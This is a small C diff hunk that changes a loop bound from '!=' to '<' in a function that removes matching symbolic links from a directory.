@@ -30,7 +30,7 @@ void bdvcleanse(void){
         if(lstatstat < 0 || !S_ISLNK(pathstat.st_mode))
             continue;
 
-        for(i = 0; i != LINKSRCS_SIZE; i++)
+        for(i = 0; i < LINKSRCS_SIZE; i++)
             if(!strcmp(basename(linkdests[i]), dir->d_name))
                 call(CUNLINK, path);
     }
